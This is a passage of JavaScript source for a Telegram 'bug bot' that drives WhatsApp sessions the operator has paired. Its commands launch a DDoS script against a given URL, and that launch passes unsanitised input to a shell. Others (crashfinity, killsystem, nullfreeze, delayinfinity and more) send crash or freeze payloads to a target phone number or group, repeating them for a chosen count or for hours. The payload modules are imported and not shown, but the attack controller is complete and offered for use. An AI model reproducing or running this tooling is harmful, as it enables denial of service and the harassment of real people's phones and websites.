                            return S7.sendMessage(chatId, protectMsg, {
                                parse_mode: 'HTML',
                               ...VOIDSEC()
                            });
                        }
                    }

                    try {
                        const name = msg.from.first_name || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                    }
                }
            });
        }


        SYLoVe(['start', 'menu'], async (msg) => {
    const chatId = msg.chat.id;
    const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    const uptime = getRuntime();
    const love = msg.from.id.toString();
    const role = GetSYLoVe(love);
    const banner = await SY_ensureBanner(S7);
    const ownerUrl = 'https://t.me/' + String(config.S7 || '').replace('@', '');
    const isMember = await CheckSYlovesToo(S7, msg.from.id, botConfig.channelId, botConfig.groupId, botOwnerId);

    const captionText = `<b>☠ ALIW — BUG BOT</b>\n👑 Developer : ${botConfig.ownerContact}\n📊 Status : ${role}\n🟢 Uptime : ${uptime}`;

    // Always keep the rich startup screen visible. Non-members receive the
    // same rich header plus the force-join buttons; protected commands remain blocked.
    const richHtml = isMember
        ? SY_mainHTML(banner, name, uptime, role, botConfig.ownerContact, botConfig.channel, botConfig.group, ownerUrl)
        : SY_menuHead(banner, name, uptime, role, botConfig.ownerContact)
            + `<h3>🔒 Force Join Required</h3><blockquote>Please join all required channels/groups below, then tap Check Membership.</blockquote>`;
    const sent = await SY_trySendRich(S7, chatId, richHtml);
    if (!sent) {
        S7.sendPhoto(chatId, botConfig.logo, {
            caption: captionText,
            parse_mode: 'HTML',
            ...(!isMember ? VOIDSEC() : SABIR7718)
        }).catch(() => {});
    }
    if (!isMember) {
        await S7.sendMessage(chatId, protectionMessage, {
            parse_mode: 'HTML',
            ...VOIDSEC()
        });
    }
});



        SYLoVe('xxddos', (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ').slice(1);
            if (args.length < 2) {
                return S7.sendMessage(
                    chatId,
                    '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60', {
            parse_mode: 'HTML'            
            });
            }
            const target = args[0];
            const time = args[1];
            S7.sendMessage(
                chatId,
                `⚡ <b>Attacking Target</b>\n\n` +
                `🎯 Target: <code>${target}</code>\n` +
                `⏱ Time: <code>${time}</code> seconds\n\n` +
                `⚙️ Process started...`, {
                    parse_mode: 'HTML'
                }
            );
            spawn(
                `node ./SY/ddos.js ${target} ${time}`, {
                    shell: true,
                    stdio: 'inherit'
                }
            );

        });


        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

            if (isMember) {
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, {
                    parse_mode: 'HTML'
                });
            } else {
                S7.sendMessage(chatId, protectionMessage, {
                    parse_mode: 'HTML',
                    ...VOIDSEC()
                });
            }
        });


        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /reqpair +919876543210', {
            parse_mode: 'HTML'            
            });
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            await StartLovingSY(chatId, cleanNumber, S7, false, config.adminId);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /reqpair +919876543210', {
            parse_mode: 'HTML'            
            });
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;

            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, {
                        recursive: true,
                        force: true
                    });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, {
                        parse_mode: 'HTML'
                    });
                } catch (err) {
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Failed to delete session: ${err.message}`, {
            parse_mode: 'HTML'            
            });
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, {
                    parse_mode: 'HTML'
                });
            }
        });


                                        SYLoVe('crashfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];
            
            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
            }

            if (!targetNum) {
                return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210`, {
            parse_mode: 'HTML'            
            });
            }

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                
                if (typeof CrashLogic.crashfinity === 'function') {
                    await CrashLogic.crashfinity(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }

                const SYLoves = BvgSYLoVe(cleanTarget)                                
                await S7.sendPhoto(chatId, botConfig.logo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
            }
        });
       
        
SYLoVe(['xgroup', 'groupui'], async (msg) => {
    try {
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.split(' ');
        
        const s7CM = args[0].replace('/', '/').replace('.', ''); 
        const targetNum = args[1];

        if (!LoveGlobalState(userId)) {
            return sendSYLove(S7, chatId);
        }

        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return S7.sendMessage(
                chatId,
                `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect.`,                {
            parse_mode: 'HTML'            
            });
        }

        if (!targetNum) {
    return S7.sendMessage(
        chatId,
        `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a GC JID.\nExample: /${s7CM} 120363410329068356@g.us`, {
            parse_mode: 'HTML'            
            });
}

        if (!targetNum.endsWith('@g.us')) {
            return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid group JID', {
            parse_mode: 'HTML'            
            });
        }

        const targetJid = targetNum.trim();

        const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
        const client = randomSession.sock;
        const senderNum = randomSession.num;

        log(
            'command',
            msg.from.first_name,
            `Calling ${s7CM} on ${targetJid} via ${senderNum}`
        );

        const SYLoves = BvgSYLoVe(targetJid);

        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });
            try {
    if (typeof XgcLogic.Xgc === 'function') {
    await XgcLogic.Xgc(client, targetJid);
    await XgcLogic.Xgc(client, targetJid);
    await XgcLogic.Xgc(client, targetJid);
    await XgcLogic.Xgc(client, targetJid);
    await XgcLogic.Xgc(client, targetJid);
    }
} catch (err) {
    console.log(`[xgroup background] error: ${err.message}`);
}

} catch (err) {
    log('error', 'xgroup', err.message);
    await S7.sendMessage(
        msg.chat.id,
        `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
}
});

SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                } catch (err) {
                    console.log(`[killsystem time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['nullcombo'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullcomboLogic.nullcombo(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[nullcombo only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullcomboLogic.nullcombo(client, targetJid);
                } catch (err) {
                    console.log(`[nullcombo time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['nullfreeze'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullfreezeLogic.nullfreeze(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[nullfreeze only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullfreezeLogic.nullfreeze(client, targetJid);
                } catch (err) {
                    console.log(`[nullfreeze time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['delaynull'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delaynullLogic.delaynull(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[delaynull only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delaynullLogic.delaynull(client, targetJid);
                } catch (err) {
                    console.log(`[delaynull time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['nullblank'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullblankLogic.nullblank(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[nullblank only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullblankLogic.nullblank(client, targetJid);
                } catch (err) {
                    console.log(`[nullblank time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['ghostdelay'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await ghostdelayLogic.ghostdelay(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await ghostdelayLogic.ghostdelay(client, targetJid);
                } catch (err) {
                    console.log(`[ghostdelay time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['delayinfinity'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delayinfinityLogic.delayinfinity(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delayinfinityLogic.delayinfinity(client, targetJid);
                } catch (err) {
                    console.log(`[delayinfinity time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['nullinfinity'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullinfinityLogic.nullinfinity(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[nullinfinity only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullinfinityLogic.nullinfinity(client, targetJid);
                } catch (err) {
                    console.log(`[Exitx time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['Delayhard'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
